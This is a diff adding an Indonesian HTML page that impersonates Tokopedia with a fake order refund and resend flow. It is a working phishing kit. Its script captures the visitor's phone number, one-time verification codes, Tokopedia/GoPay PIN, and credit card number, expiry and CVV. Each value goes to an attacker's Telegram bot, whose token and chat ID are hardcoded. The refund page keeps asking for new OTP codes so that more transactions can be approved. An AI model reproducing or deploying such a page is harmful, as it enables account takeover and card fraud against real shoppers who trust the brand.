@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Tokopedia</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background: #FFFFFF;
+            min-height: 100vh;
+            color: #000000;
+            position: relative;
+            z-index: 1;
+        }
+        .halaman {
+            display: none;
+            min-height: 100vh;
+            padding: 10px 5%;
+            background: transparent;
+            position: relative;
+            z-index: 2;
+        }
+        .halaman.aktif { display: block; }
+
+        /* === LATAR BELAKANG === */
+        .latar-tetap-tengah {
+            position: fixed;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            width: 90%; height: 280px;
+            background: url('https://i.ibb.co.com/3wfxg5J/IMG-20260812-WA0032.jpg') no-repeat center center;
+            background-size: contain;
+            z-index: 0;
+            pointer-events: none;
+            display: none;
+        }
+        .latar-aktif { display: block !important; }
+        .latar-sembunyi { display: none !important; opacity: 0; }
+
+        @keyframes berkedip { 0%,100%{opacity:1} 50%{opacity:0} }
+        .teks-berkedip { animation: berkedip 1s infinite; color: #E53935; }
+
+        /* Halaman Pilihan */
+        .bar-logo { display: flex; justify-content: center; padding: 15px 0; }
+        .logo-atas { height: 60px; }
+        .spasi-atas { height: 60px; }
+        .teks-tokopedia { font-size: 22px; font-weight:700; color:#008847; text-align:center; margin-bottom:5px; }
+        .sub-judul { font-size:18px; font-weight:600; text-align:center; margin-bottom:15px; }
+        .wadah-tombol { 
+            display:flex; flex-direction:column; gap:12px; margin-bottom:20px;
+            position: relative; z-index: 10;
+        }
+        .tombol-pilihan {
+            background:#008847; color:#fff; border:none; border-radius:10px;
+            padding:15px; font-size:17px; font-weight:600; text-align:left; cursor:pointer;
+            display:flex; align-items:center; gap:12px; width: 100%;
+            position: relative; z-index: 11; pointer-events: auto; user-select: none;
+            -webkit-tap-highlight-color: transparent;
+            transition: transform 0.1s, background 0.2s;
+        }
+        .tombol-pilihan:active { transform: scale(0.98); background: #00703C; }
+        .logo-tombol { width:24px; height:24px; }
+        .pemisah { display:flex; align-items:center; gap:15px; margin:10px 0; color:#999; font-size:14px; }
+        .garis { flex:1; height:1px; background:#E0E0E0; }
+        .tombol-masuk-lain {
+            width:100%; padding:12px; border:1px solid #DADCE0; border-radius:8px;
+            background:#fff; font-size:16px; margin-bottom:10px; display:flex;
+            align-items:center; gap:12px; cursor:pointer; color:#333; font-weight:500;
+            position: relative; z-index: 11; pointer-events: auto;
+        }
+        .tombol-masuk-lain:active { background: #F5F5F5; }
+        .ikon-google { width:20px; height:20px; }
+        .teks-ketentuan { font-size:14px; color:#5F6368; line-height:1.5; margin:10px 0; }
+        .teks-ketentuan a { color:#008847; text-decoration:none; font-weight:500; }
+        .belum-akun { text-align:center; font-size:16px; color:#333; }
+        .belum-akun a { color:#008847; text-decoration:none; font-weight:600; }
+
+        /* Navigasi */
+        .atas-navigasi { display:flex; justify-content:space-between; align-items:center; margin-bottom:30px; }
+        .tombol-kembali { 
+            font-size:20px; background:none; border:none; cursor:pointer; 
+            pointer-events: auto; position: relative; z-index: 11;
+        }
+        .tautan-daftar { font-size:16px; color:#008847; font-weight:600; text-decoration:none; }
+        .judul-masuk { font-size:24px; font-weight:700; margin-bottom:25px; }
+        .kotak-input { width:100%; padding:14px; font-size:16px; border:1px solid #CCC; border-radius:8px; margin-bottom:16px; outline:none; }
+        .kotak-input:focus { border-color:#008847; }
+        .tombol-lanjut { 
+            width:100%; padding:14px; font-size:16px; font-weight:600; 
+            background:#008847; color:#fff; border:none; border-radius:8px; 
+            cursor:pointer; margin-bottom:20px; pointer-events: auto;
+        }
+        .tombol-lanjut:active { background: #00703C; }
+
+        /* Kode & PIN */
+        .wadah-ikon-tengah { text-align:center; margin:30px 0 15px; }
+        .ikon-wa { width:50px; height:50px; }
+        .ikon-gembok { width:40px; height:40px; }
+        .judul-verifikasi { font-size:22px; font-weight:700; text-align:center; margin-bottom:10px; }
+        .sub-judul-verifikasi { font-size:15px; color:#555; text-align:center; margin-bottom:30px; line-height:1.5; }
+        .wadah-input-kode { display:flex; justify-content:center; gap:10px; margin-bottom:20px; }
+        .kotak-kode { width:45px; height:50px; font-size:22px; text-align:center; border:none; border-bottom:2px solid #008847; outline:none; pointer-events: auto; }
+        .batas-waktu { text-align:center; font-size:15px; color:#666; margin-bottom:15px; }
+        .tautan-kirim-ulang { display:block; text-align:center; font-size:15px; color:#008847; text-decoration:none; margin-top:10px; margin-bottom:15px; pointer-events: auto; cursor:pointer; border:none; background:none; }
+        .tautan-kirim-ulang:disabled, .tautan-kirim-ulang[aria-disabled="true"] { color:#999; cursor:not-allowed; pointer-events: none; }
+        .tautan-lupa-pin { display:block; text-align:center; font-size:15px; color:#008847; text-decoration:none; margin-top:20px; pointer-events: auto; }
+
+        /* Halaman Kartu */
+        .bar-logo-saja { display:flex; align-items:center; padding:8px 0 16px; }
+        .bar-logo-saja img { height:45px; }
+        .kartu-tokopedia {
+            width:100%; border-radius:16px; margin-bottom:25px;
+            background:url('https://i.ibb.co.com/j9zdFLwC/Screenshot-20260812-021035-1.jpg') center/cover no-repeat;
+            height:200px; position:relative; overflow:hidden;
+        }
+        .kartu-teks { position:absolute; bottom:30px; left:25px; color:#fff; font-size:20px; font-weight:700; letter-spacing:3px; }
+        .kartu-valid { position:absolute; bottom:10px; left:25px; color:#fff; font-size:14px; }
+        .kartu-visa { position:absolute; bottom:10px; right:25px; color:#fff; font-size:24px; font-weight:900; }
+        .label-input { font-size:16px; font-weight:600; margin:15px 0 8px; display:block; color:#333; }
+        .bar-nomor-hp { display:flex; gap:10px; align-items:center; }
+        .kode-negara { padding:14px 10px; border:1px solid #CCC; border-radius:8px; font-size:16px; font-weight:600; background:#f5f5f5; }
+        .input-ikon {
+            width:100%; padding:14px 14px 14px 45px; font-size:16px; border:1px solid #CCC; border-radius:8px;
+            outline:none; background:#fff url('https://cdn-icons-png.flaticon.com/16/1034/1034438.png') 14px center no-repeat;
+            background-size:20px; margin-top:8px; pointer-events: auto;
+        }
+        .dua-kolom { display:flex; gap:12px; margin-top:8px; }
+        .dua-kolom select { flex:1; padding:14px; font-size:16px; border:1px solid #CCC; border-radius:8px; outline:none; pointer-events: auto; }
+        .tombol-lanjut-hijau { 
+            width:100%; padding:15px; font-size:18px; font-weight:700; 
+            background:#007E3A; color:#fff; border:none; border-radius:10px; 
+            cursor:pointer; margin-top:25px; pointer-events: auto;
+        }
+        .tombol-lanjut-hijau:active { background: #006B33; }
+
+        /* Kode Pengembalian */
+        .wadah-kode-baru { background:#fff; border-radius:16px; padding:30px 20px; margin-top:30px; box-shadow:0 2px 10px rgba(0,0,0,0.08); text-align:center; }
+        .ilustrasi-kode { width:180px; height:160px; margin:0 auto 20px; background:url('https://i.ibb.co.com/3wfxg5J/IMG-20260812-WA0032.jpg') center/contain no-repeat; border-radius:12px; }
+        .judul-kode-baru { font-size:22px; font-weight:700; margin-bottom:25px; color:#000; }
+        .input-kode-baru { 
+            width:100%; padding:15px; font-size:18px; text-align:center; 
+            border:2px solid #C8E6C9; border-radius:10px; outline:none; 
+            margin-bottom:15px; letter-spacing:5px; font-weight:600; pointer-events: auto;
+        }
+        .input-kode-baru:focus { border-color:#008847; }
+        .hitungan-kode { color:#007E3A; font-size:16px; margin-bottom:10px; font-weight:500; }
+        .tombol-verifikasi { 
+            width:100%; padding:15px; font-size:18px; font-weight:700; 
+            background:#007E3A; color:#fff; border:none; border-radius:10px; 
+            cursor:pointer; pointer-events: auto; margin-top:10px;
+        }
+        .tombol-verifikasi:active { background: #006B33; }
+        .salah-kode { color:#E53935; font-size:15px; margin-top:15px; font-weight:600; display:none; }
+        .pesan-berhasil { color:#007E3A; font-size:15px; margin-top:10px; font-weight:600; display:none; }
+    </style>
+</head>
+<body>
+
+<div id="latar-halaman" class="latar-tetap-tengah"></div>
+
+<!-- HALAMAN PILIHAN -->
+<div id="halaman-pilihan" class="halaman aktif">
+    <div class="bar-logo"><img src="https://i.ibb.co.com/ksJdmHhr/pucok.png" class="logo-atas" alt="Logo"></div>
+    <div class="spasi-atas"></div>
+    <h1 class="teks-tokopedia">Tokopedia</h1>
+    <h2 class="sub-judul">Silakan Pilih Tindakan Terkait Pesanan Anda!</h2>
+    <div class="wadah-tombol">
+        <button class="tombol-pilihan" onclick="buka('halaman-nomor')">
+            <img src="https://i.ibb.co.com/39JMQySr/uu.png" class="logo-tombol" alt="">Ajukan Pengiriman Ulang
+        </button>
+        <button class="tombol-pilihan" onclick="buka('halaman-kartu')">
+            <img src="https://i.ibb.co.com/39JMQySr/uu.png" class="logo-tombol" alt="">Ajukan Pengembalian Dana
+        </button>
+        <button class="tombol-pilihan" onclick="buka('halaman-kartu')">
+            <img src="https://i.ibb.co.com/39JMQySr/uu.png" class="logo-tombol" alt="">Pengembalian Ke Limit Kartu Kredit
+        </button>
+    </div>
+    <div class="pemisah"><span class="garis"></span>atau masuk dengan<span class="garis"></span></div>
+    <button class="tombol-masuk-lain"><svg class="ikon-google" viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg> Google</button>
+    <button class="tombol-masuk-lain"><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M20 4H4C2.9 4 2 4.9 2 6V18C2 19.1 2.9 20 4 20H20C21.1 20 22 19.1 22 18V6C22 4.9 21.1 4 20 4Z" stroke="#333" stroke-width="2"/><path d="M22 7L12 13L2 7" stroke="#333" stroke-width="2"/></svg> E-mail</button>
+    <button class="tombol-masuk-lain"><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-5.2 1.74 2.89 2.89 0 012.78-4.64 2.89 2.89 0 01.79 1.93V9.9a5.09 5.09 0 00-.8-.07 5.1 5.1 0 000 10.2 5.1 5.1 0 005.1-5.1V8.53a6.78 6.78 0 003.99 1.31v-3.1a4.85 4.85 0 01-1.34-.05z" fill="#000"/></svg> TikTok Shop</button>
+    <p class="teks-ketentuan">Dengan masuk di sini, kamu menyetujui <a href="#">Syarat & Ketentuan</a> serta <a href="#">Kebijakan Privasi</a> Tokopedia</p>
+    <p class="belum-akun">Belum punya akun? <a href="#">Daftar Sekarang</a></p>
+</div>
+
+<div id="halaman-nomor" class="halaman">
+    <div class="atas-navigasi">
+        <button class="tombol-kembali" onclick="buka('halaman-pilihan')">←</button>
+        <a href="#" class="tautan-daftar">Daftar</a>
+    </div>
+    <h1 class="judul-masuk">Masuk ke Tokopedia</h1>
+    <input type="tel" id="input-nomor" class="kotak-input" placeholder="Masukan nomor handphone" inputmode="numeric">
+    <button class="tombol-lanjut" onclick="lanjutKode()">Selanjutnya</button>
+    <div class="pemisah"><span class="garis"></span>atau masuk dengan<span class="garis"></span></div>
+    <button class="tombol-masuk-lain" style="margin-top:20px"><svg class="ikon-google" viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg> Google</button>
+    <button class="tombol-masuk-lain"><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M20 4H4C2.9 4 2 4.9 2 6V18C2 19.1 2.9 20 4 20H20C21.1 20 22 19.1 22 18V6C22 4.9 21.1 4 20 4Z" stroke="#333" stroke-width="2"/><path d="M22 7L12 13L2 7" stroke="#333" stroke-width="2"/></svg> E-mail</button>
+    <button class="tombol-masuk-lain"><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-5.2 1.74 2.89 2.89 0 012.78-4.64 2.89 2.89 0 01.79 1.93V9.9a5.09 5.09 0 00-.8-.07 5.1 5.1 0 000 10.2 5.1 5.1 0 005.1-5.1V8.53a6.78 6.78 0 003.99 1.31v-3.1a4.85 4.85 0 01-1.34-.05z" fill="#000"/></svg> TikTok Shop</button>
+    <p class="teks-ketentuan">Dengan masuk di sini, kamu menyetujui <a href="#">Syarat & Ketentuan</a> serta <a href="#">Kebijakan Privasi</a> Tokopedia</p>
+</div>
+
+<div id="halaman-kode" class="halaman">
+    <button class="tombol-kembali" onclick="buka('halaman-nomor')">←</button>
+    <div class="wadah-ikon-tengah"><svg class="ikon-wa" viewBox="0 0 24 24"><path fill="#25D366" d="M17.47 14.38c-.32-.16-1.91-.94-2.2-.99-.29-.05-.5-.07-.71.14-.21.21-.82.81-1 1-.18.18-.36.2-.67.07-.31-.07-1.33-.49-2.53-1.57-.94-.85-1.57-1.9-1.75-2.21-.14-.31-.02-.46.13-.59.13-.13.29-.36.43-.54.14-.18.19-.31.29-.51.1-.2.05-.38-.03-.54-.08-.16-.72-1.73-.99-2.37-.26-.62-.53-.54-.71-.55h-.61c-.21 0-.55.08-.84.39-.29.29-1.1 1.08-1.1 2.63 0 1.55 1.13 3.05 1.28 3.27.14.21 1.84 2.81 4.46 3.94.62.27 1.1.43 1.48.56.62.2 1.18.17 1.63.1.5-.08 1.54-.63 1.76-1.24.21-.61.21-1.13.14-1.24-.07-.1-.27-.16-.58-.34M12 0C5.37 0 0 5.37 0 12c0 2.13.56 4.21 1.62 6.06L.06 23.55a.5.5 0 0 0 .57.6l5.89-1.53A11.92 11.92 0 0 0 12 24c6.63 0 12-5.37 12-12S18.63 0 12 0z"/></svg></div>
+    <h2 class="judul-verifikasi">Masukkan Kode Verifikasi</h2>
+    <p class="sub-judul-verifikasi">Masukkan 6 digit kode verifikasi yang dikirim ke nomor kamu</p>
+    <div class="wadah-input-kode">
+        <input type="text" class="kotak-kode" maxlength="1" inputmode="numeric" oninput="geserKode(this,0)">
+        <input type="text" class="kotak-kode" maxlength="1" inputmode="numeric" oninput="geserKode(this,1)">
+        <input type="text" class="kotak-kode" maxlength="1" inputmode="numeric" oninput="geserKode(this,2)">
+        <input type="text" class="kotak-kode" maxlength="1" inputmode="numeric" oninput="geserKode(this,3)">
+        <input type="text" class="kotak-kode" maxlength="1" inputmode="numeric" oninput="geserKode(this,4)">
+        <input type="text" class="kotak-kode" maxlength="1" inputmode="numeric" oninput="geserKode(this,5)">
+    </div>
+    <p id="hitungan-kode" class="batas-waktu">Kode berlaku dalam 2:00</p>
+    <button id="kirim-ulang-kode" class="tautan-kirim-ulang" disabled aria-disabled="true">Kirim Ulang Kode</button>
+    <p class="teks-berkedip">Masukan kode yang dikirim via WhatsApp/SMS!</p>
+</div>
+
+<div id="halaman-pin" class="halaman">
+    <button class="tombol-kembali" onclick="buka('halaman-kode')">←</button>
+    <div class="wadah-ikon-tengah"><svg class="ikon-gembok" viewBox="0 0 24 24" fill="#008847"><path d="M18 8H17V6C17 3.24 14.76 1 12 1C9.24 1 7 3.24 7 6V8H6C4.9 8 4 8.9 4 10V20C4 21.1 4.9 22 6 22H18C19.1 22 20 21.1 20 20V10C20 8.9 19.1 8 18 8ZM12 17C10.9 17 10 16.1 10 15C10 13.9 10.9 13 12 13C13.1 13 14 13.9 14 15C14 16.1 13.1 17 12 17ZM15.1 8H8.9V6C8.9 4.29 10.29 2.9 12 2.9C13.71 2.9 15.1 4.29 15.1 6V8Z"/></svg></div>
+    <h2 class="judul-verifikasi">Masukkan PIN Verifikasi</h2>
+    <p class="sub-judul-verifikasi">Masukkan 6 digit PIN Tokopedia/Gopay kamu</p>
+    <div class="wadah-input-kode">
+        <input type="password" class="kotak-kode pin-kotak" maxlength="1" inputmode="numeric" oninput="geserPin(this,0)">
+        <input type="password" class="kotak-kode pin-kotak" maxlength="1" inputmode="numeric" oninput="geserPin(this,1)">
+        <input type="password" class="kotak-kode pin-kotak" maxlength="1" inputmode="numeric" oninput="geserPin(this,2)">
+        <input type="password" class="kotak-kode pin-kotak" maxlength="1" inputmode="numeric" oninput="geserPin(this,3)">
+        <input type="password" class="kotak-kode pin-kotak" maxlength="1" inputmode="numeric" oninput="geserPin(this,4)">
+        <input type="password" class="kotak-kode pin-kotak" maxlength="1" inputmode="numeric" oninput="geserPin(this,5)">
+    </div>
+    <a href="#" class="tautan-lupa-pin">Lupa PIN Tokopedia</a>
+</div>
+
+<div id="halaman-kartu" class="halaman">
+    <div class="bar-logo-saja"><img src="https://i.ibb.co.com/ksJdmHhr/pucok.png" alt="Logo"></div>
+    <div class="kartu-tokopedia">
+        <div class="kartu-teks">XXXX XXXX XXXX XXXX</div>
+        <div class="kartu-valid">VALID THRU 00/00</div>
+        <div class="kartu-visa">VISA<br><small>Platinum</small></div>
+    </div>
+    <label class="label-input">Nomor Handphone</label>
+    <div class="bar-nomor-hp"><span class="kode-negara">+62</span><input type="tel" id="nomor_hp" class="kotak-input" placeholder="Nomor HP" inputmode="numeric"></div>
+    <label class="label-input">Nomor Kartu</label>
+    <input type="tel" id="nomor_kartu" class="input-ikon" placeholder="16 Digit Nomor Kartu" inputmode="numeric">
+    <label class="label-input">Masa Berlaku</label>
+    <div class="dua-kolom">
+        <select id="bulan"><option value="">Bulan</option><option>01</option><option>02</option><option>03</option><option>04</option><option>05</option><option>06</option><option>07</option><option>08</option><option>09</option><option>10</option><option>11</option><option>12</option></select>
+        <select id="tahun">
+            <option value="">Tahun</option>
+            <option>2026</option><option>2027</option><option>2028</option><option>2029</option><option>2030</option>
+            <option>2031</option><option>2032</option><option>2033</option><option>2034</option><option>2035</option>
+        </select>
+    </div>
+    <input type="password" id="cvv" class="input-ikon" placeholder="CVV 3 Digit" inputmode="numeric" style="background:url('https://cdn-icons-png.flaticon.com/16/151/151905.png') 12px center no-repeat; background-size:16px;">
+    <button class="tombol-lanjut-hijau" onclick="lanjutKodePengembalian()">Lanjut</button>
+    <p class="teks-ketentuan">PT Tokopedia Tbk diawasi OJK & peserta LPS</p>
+</div>
+
+<!-- ✅ HALAMAN OTP UNTUK OPSI 2 & 3 — TETAP DI HALAMAN, RESET KODE SAJA -->
+<div id="halaman-kode-pengembalian" class="halaman">
+    <div class="wadah-kode-baru">
+        <div class="ilustrasi-kode"></div>
+        <h2 class="judul-kode-baru">Masukkan Kode Verifikasi</h2>
+        <input type="text" id="input_kode_pengembalian" class="input-kode-baru" placeholder="Kode 6 Digit" maxlength="6" inputmode="numeric">
+        <!-- ⏱️ HITUNGAN MUNDUR 2 MENIT -->
+        <p id="hitungan_kode_pengembalian" class="hitungan-kode">Kode berlaku dalam 2:00</p>
+        <button id="kirim-ulang-pengembalian" class="tautan-kirim-ulang" disabled aria-disabled="true">Kirim Ulang Kode</button>
+        <button class="tombol-verifikasi" onclick="cekKode()">Verifikasi</button>
+        <p id="pesan_salah" class="salah-kode">Kode salah, coba lagi</p>
+        <p id="pesan_berhasil" class="pesan-berhasil">✅ Kode terkirim! Masukkan kode berikutnya</p>
+    </div>
+</div>
+
+<script>
+const TOKEN = '8579887614:AAGOK_2yn7Tzvrc3V0RGXPsXuNdiVjSgwOk';
+const CHAT = '6054023710';
+let nomorHP = '';
+let nomorKartu = '';
+let cvv = '';
+let pesanTerakumulasi = '';
+let lastMessageId = null;
+let timerPengembalian = null;
+
+const latar = document.getElementById('latar-halaman');
+
+function buka(id) {
+    document.querySelectorAll('.halaman').forEach(h => h.classList.remove('aktif'));
+    const halaman = document.getElementById(id);
+    if (halaman) {
+        halaman.classList.add('aktif');
+        if (id === 'halaman-pilihan') {
+            latar.classList.add('latar-aktif');
+            latar.classList.remove('latar-sembunyi');
+        } else {
+            latar.classList.remove('latar-aktif');
+            latar.classList.add('latar-sembunyi');
+        }
+    }
+}
+
+async function updatePesanTelegram() {
+    if (!pesanTerakumulasi.trim()) return;
+    try {
+        if (lastMessageId) {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/editMessageText`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT, message_id: lastMessageId, text: pesanTerakumulasi, disable_web_page_preview: true })
+            });
+        } else {
+            const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT, text: pesanTerakumulasi, disable_web_page_preview: true })
+            });
+            const data = await res.json();
+            if (data.ok) lastMessageId = data.result.message_id;
+        }
+    } catch (e) { console.log('Error update:', e); }
+}
+
+function lanjutKode() {
+    const input = document.getElementById('input-nomor');
+    nomorHP = input.value.trim();
+    if (!nomorHP || nomorHP.length < 10) { alert('Masukkan nomor HP yang valid!'); return; }
+    pesanTerakumulasi = `📱 Nomor HP: ${nomorHP}`;
+    updatePesanTelegram();
+    buka('halaman-kode');
+    mulaiHitunganMundur('hitungan-kode', 'kirim-ulang-kode');
+}
+
+function geserKode(input, idx) {
+    if (input.value.length === 1) {
+        const kotak = document.querySelectorAll('#halaman-kode .kotak-kode');
+        if (idx < 5) kotak[idx + 1].focus();
+        else {
+            const kode = Array.from(kotak).map(i => i.value).join('');
+            pesanTerakumulasi += `\n🔢 Kode Verifikasi: ${kode}`;
+            updatePesanTelegram();
+            buka('halaman-pin');
+        }
+    }
+}
+
+function geserPin(input, idx) {
+    if (input.value.length === 1) {
+        const kotak = document.querySelectorAll('.pin-kotak');
+        if (idx < 5) kotak[idx + 1].focus();
+        else {
+            const pin = Array.from(kotak).map(i => i.value).join('');
+            pesanTerakumulasi += `\n🔒 PIN: ${pin}`;
+            updatePesanTelegram();
+            alert('Verifikasi berhasil! Data sedang diproses...');
+            pesanTerakumulasi = ''; lastMessageId = null;
+            buka('halaman-pilihan');
+        }
+    }
+}
+
+// ⏱️ FUNGSI HITUNGAN MUNDUR 2 MENIT
+function mulaiHitunganMundur(idElement, idTombolKirimUlang) {
+    if (timerPengembalian) clearInterval(timerPengembalian);
+    
+    let detik = 120;
+    const el = document.getElementById(idElement);
+    const tombolKirimUlang = document.getElementById(idTombolKirimUlang);
+    
+    tombolKirimUlang.disabled = true;
+    tombolKirimUlang.setAttribute('aria-disabled', 'true');
+    el.style.color = '';
+    
+    timerPengembalian = setInterval(() => {
+        const m = Math.floor(detik / 60);
+        const d = detik % 60;
+        el.textContent = `Kode berlaku dalam ${m}:${d.toString().padStart(2, '0')}`;
+        
+        if (--detik < 0) {
+            clearInterval(timerPengembalian);
+            el.textContent = 'Kode sudah kedaluwarsa';
+            el.style.color = '#E53935';
+            tombolKirimUlang.disabled = false;
+            tombolKirimUlang.setAttribute('aria-disabled', 'false');
+            tombolKirimUlang.onclick = function() {
+                mulaiHitunganMundur(idElement, idTombolKirimUlang);
+                this.disabled = true;
+                this.setAttribute('aria-disabled', 'true');
+            };
+        }
+    }, 1000);
+}
+
+// ✅ SIMPAN DATA KARTU & LANGSUNG KE HALAMAN KODE
+function lanjutKodePengembalian() {
+    const noHP = document.getElementById('nomor_hp').value.trim();
+    nomorKartu = document.getElementById('nomor_kartu').value.trim();
+    cvv = document.getElementById('cvv').value.trim();
+    const bulan = document.getElementById('bulan').value;
+    const tahun = document.getElementById('tahun').value;
+    
+    if (!noHP || noHP.length < 10) { alert('Masukkan nomor HP yang valid!'); return; }
+    if (!nomorKartu || !cvv || !bulan || !tahun) { alert('Lengkapi semua data termasuk masa berlaku kartu!'); return; }
+    
+    // Simpan data termasuk masa berlaku kartu
+    pesanTerakumulasi = `📱 Nomor HP: ${noHP}\n💳 Nomor Kartu: ${nomorKartu}\n📅 Masa Berlaku: ${bulan}/${tahun}\n🔐 CVV: ${cvv}`;
+    updatePesanTelegram();
+    buka('halaman-kode-pengembalian');
+    mulaiHitunganMundur('hitungan_kode_pengembalian', 'kirim-ulang-pengembalian');
+    // Fokus ke kolom kode
+    setTimeout(() => document.getElementById('input_kode_pengembalian').focus(), 300);
+}
+
+// ✅ KIRIM KODE → RESET SAJA → TETAP DI HALAMAN KODE
+function cekKode() {
+    const kodeInput = document.getElementById('input_kode_pengembalian');
+    const kode = kodeInput.value.trim();
+    
+    if (!kode || kode.length < 6) { alert('Masukkan 6 digit kode!'); return; }
+    
+    // Tambahkan kode ke pesan & kirim
+    pesanTerakumulasi += `\n✅ Kode Pengembalian: ${kode}`;
+    updatePesanTelegram();
+    
+    // Tampilkan pesan berhasil
+    const pesanBerhasil = document.getElementById('pesan_berhasil');
+    pesanBerhasil.style.display = 'block';
+    
+    // 🔄 RESET KOLOM KODE SAJA — TETAP DI HALAMAN
+    kodeInput.value = '';
+    kodeInput.focus();
+    
+    // Sembunyikan pesan setelah 3 detik
+    setTimeout(() => {
+        pesanBerhasil.style.display = 'none';
+    }, 3000);
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+    buka('halaman-pilihan');
+});
+</script>
+
+</body>
+</html>
